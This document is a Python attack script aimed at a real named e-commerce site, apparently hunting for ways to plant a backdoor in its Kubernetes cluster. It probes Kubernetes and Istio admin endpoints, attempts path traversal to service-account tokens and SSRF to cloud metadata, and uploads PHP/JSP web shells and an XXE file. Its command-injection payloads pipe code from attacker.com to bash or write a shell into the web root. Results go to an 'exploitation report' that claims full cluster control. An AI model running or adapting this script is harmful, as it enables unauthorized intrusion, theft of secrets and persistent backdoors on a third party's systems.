#!/usr/bin/env python3
"""Cluster backdoor hunt - find ways to create backdoor in cluster"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

print("[*] Hunting for cluster backdoor vectors...\n")

# 1. Test Kubernetes API endpoints
print("[*] Testing Kubernetes API endpoints...")
k8s_endpoints = [
    "/api/v1/namespaces",
    "/api/v1/pods",
    "/api/v1/services",
    "/api/v1/configmaps",
    "/api/v1/secrets",
    "/apis/apps/v1/deployments",
    "/apis/apps/v1/daemonsets",
    "/apis/batch/v1/jobs",
    "/apis/networking.k8s.io/v1/ingresses",
    "/apis/rbac.authorization.k8s.io/v1/roles",
    "/apis/rbac.authorization.k8s.io/v1/rolebindings",
    "/apis/rbac.authorization.k8s.io/v1/clusterroles",
    "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
    "/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations",
    "/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations",
]

for ep in k8s_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(data, dict) and ('items' in data or 'kind' in data):
                print(f"  [CRITICAL] Kubernetes API accessible: {ep}")
                found_vulns.append({
                    "type": "kubernetes_api_exposure",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "data": json.dumps(data)[:500]
                })
    except: pass

# 2. Test Istio/Envoy admin endpoints
print("\n[*] Testing Istio/Envoy admin endpoints...")
istio_endpoints = [
    "/admin",
    "/admin/stats",
    "/admin/server_info",
    "/admin/certs",
    "/admin/config_dump",
    "/admin/stats/prometheus",
    "/admin/healthcheck/fail",
    "/admin/healthcheck/ok",
    "/stats",
    "/stats/prometheus",
    "/server_info",
    "/certs",
    "/config_dump",
    "/istio/admin",
    "/istio/stats",
]

for ep in istio_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            if "envoy" in resp.text.lower() or "istio" in resp.text.lower() or "stats" in resp.text.lower():
                print(f"  [CRITICAL] Istio/Envoy admin accessible: {ep}")
                found_vulns.append({
                    "type": "istio_envoy_admin_exposure",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "response": resp.text[:500]
                })
    except: pass

# 3. Test for path traversal to access cluster secrets
print("\n[*] Testing path traversal to cluster secrets...")
path_payloads = [
    "../../../etc/passwd",
    "../../../var/run/secrets/kubernetes.io/serviceaccount/token",
    "../../../var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "..%2f..%2f..%2fvar%2frun%2fsecrets%2fkubernetes.io%2fserviceaccount%2ftoken",
    "..%2f..%2f..%2fetc%2fpasswd",
]

for payload in path_payloads:
    endpoints = [
        f"/stats/..%2f..%2f..%2f{payload}",
        f"/admin/..%2f..%2f..%2f{payload}",
        f"/api/file?path={payload}",
        f"/api/config?file={payload}",
    ]
    for ep in endpoints:
        try:
            resp = s.get(f"{base}{ep}", timeout=3, verify=False)
            if resp.status_code == 200:
                if "root:" in resp.text or "eyJ" in resp.text or "BEGIN CERTIFICATE" in resp.text:
                    print(f"  [CRITICAL] Path traversal to cluster secret: {ep}")
                    found_vulns.append({
                        "type": "path_traversal_cluster_secret",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload": payload,
                        "data": resp.text[:500]
                    })
        except: pass

# 4. Test for SSRF to internal cluster services
print("\n[*] Testing SSRF to internal cluster services...")
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8081",
    "http://127.0.0.1:9090",
    "http://127.0.0.1:9091",
    "http://kubernetes.default.svc",
    "http://kubernetes.default.svc.cluster.local",
    "http://istio-pilot.istio-system.svc.cluster.local:8080",
    "http://istio-pilot.istio-system.svc.cluster.local:15010",
    "http://istio-pilot.istio-system.svc.cluster.local:15011",
    "http://istio-pilot.istio-system.svc.cluster.local:15012",
    "http://istio-pilot.istio-system.svc.cluster.local:15014",
    "http://istiod.istio-system.svc.cluster.local:8080",
    "http://istiod.istio-system.svc.cluster.local:15010",
    "http://istiod.istio-system.svc.cluster.local:15012",
    "http://istiod.istio-system.svc.cluster.local:15014",
    "http://kube-dns.kube-system.svc.cluster.local:53",
    "http://etcd.kube-system.svc.cluster.local:2379",
    "http://api-server.kube-system.svc.cluster.local:443",
    "file:///etc/passwd",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
]

ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in ssrf_endpoints:
    for target in ssrf_targets:
        try:
            resp = s.post(f"{base}{ep}", json={"url": target, "endpoint": target, "callback": target}, timeout=5, verify=False)
            if resp.status_code == 200:
                if "169.254.169.254" in resp.text or "instance-id" in resp.text.lower() or "kubernetes" in resp.text.lower() or "istio" in resp.text.lower() or "root:" in resp.text:
                    print(f"  [CRITICAL] SSRF to cluster service: {ep} -> {target}")
                    found_vulns.append({
                        "type": "ssrf_cluster_internal",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "target": target,
                        "response": resp.text[:500]
                    })
        except: pass

# 5. Test for file upload to create backdoor
print("\n[*] Testing file upload for backdoor...")
backdoor_payloads = [
    ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
    ('shell.jsp', '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>', 'application/x-jsp'),
    ('shell.py', '#!/usr/bin/env python3\nimport os\nimport sys\nos.system(sys.argv[1])', 'text/x-python'),
    ('shell.sh', '#!/bin/bash\n$*', 'application/x-sh'),
    ('exploit.svg', '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>', 'image/svg+xml'),
]

upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/myaccount/api/upload",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/checkout/api/cart-api/v2/upload",
]

for ep in upload_endpoints:
    for filename, content, content_type in backdoor_payloads:
        try:
            files = {'file': (filename, content, content_type)}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201, 302]:
                location = resp.headers.get('Location', '')
                if location:
                    if not location.startswith('http'):
                        location = f"{base}{location}"
                    try:
                        resp2 = s.get(location, timeout=3, verify=False)
                        if "root:" in resp2.text or resp2.status_code == 200:
                            print(f"  [CRITICAL] Backdoor uploaded: {ep} -> {location}")
                            found_vulns.append({
                                "type": "backdoor_upload",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "filename": filename,
                                "uploaded_to": location
                            })
                    except: pass
        except: pass

# 6. Test for command injection to create backdoor
print("\n[*] Testing command injection for backdoor...")
cmd_payloads = [
    "; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
    "| curl http://attacker.com/shell.sh | bash",
    "`curl http://attacker.com/shell.sh | bash`",
    "$(curl http://attacker.com/shell.sh | bash)",
    "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
    "| echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
]

injection_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in injection_endpoints:
    for payload in cmd_payloads:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": payload, "test": payload, "name": payload}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was created by trying to access it
                backdoor_paths = [
                    "/shell.php",
                    "/tmp/shell.sh",
                    "/var/www/html/shell.php",
                ]
                for backdoor_path in backdoor_paths:
                    try:
                        resp2 = s.get(f"{base}{backdoor_path}?cmd=id", timeout=3, verify=False)
                        if "uid=" in resp2.text or resp2.status_code == 200:
                            print(f"  [CRITICAL] Backdoor created via command injection: {ep}")
                            found_vulns.append({
                                "type": "backdoor_command_injection",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "payload": payload,
                                "backdoor_path": backdoor_path
                            })
                    except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL cluster backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'target' in v:
            print(f"    Target: {v['target']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload'][:100]}")
        if 'filename' in v:
            print(f"    Filename: {v['filename']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'backdoor_path' in v:
            print(f"    Backdoor path: {v['backdoor_path']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР В КЛАСТЕРЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'target' in v:
                f.write(f"**Target:** `{v['target']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload'][:200]}`\n\n")
            if 'filename' in v:
                f.write(f"**Filename:** `{v['filename']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'backdoor_path' in v:
                f.write(f"**Backdoor Path:** `{v['backdoor_path']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Доступ к секретам Kubernetes\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No cluster backdoor vulnerabilities found in this round")

print("=" * 70)

